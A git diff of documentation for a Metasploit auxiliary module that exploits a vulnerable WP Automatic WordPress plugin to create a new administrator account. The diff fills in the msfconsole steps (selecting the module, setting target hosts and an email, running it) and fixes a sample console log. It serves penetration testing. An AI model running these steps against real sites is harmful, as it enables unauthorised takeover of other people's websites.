@@ -15,10 +15,11 @@ A vulnerable version of the plugin can be downloaded [here](https://legendblogs.
 
 1. Install the vulnerable plugin
 1. Start msfconsole
-1. Do: `use `
-1. Do: ``
+1. Do: `use auxiliary/admin/http/wp_automatic_plugin_privesc`
+1. Do: `set rhosts [IPs]`
+1. Do: `set email [email address]`
 1. Do: `run`
-1. You should .
+1. You should get an email to setup your new admin account.
 
 ## Options
 
@@ -38,7 +39,7 @@ Wordpress Administration Email. No default.
 ### wp-automatic 3.50.7 on Wordpress 5.4.4 No WPEMAIL
 
 ```
-resource (automatic.rb)> use wp_automatic_plugin_privesc
+resource (automatic.rb)> use auxiliary/admin/http/wp_automatic_plugin_privesc
 [*] Using auxiliary/admin/http/wp_automatic_plugin_privesc
 resource (automatic.rb)> set rhosts 1.1.1.1
 rhosts => 1.1.1.1
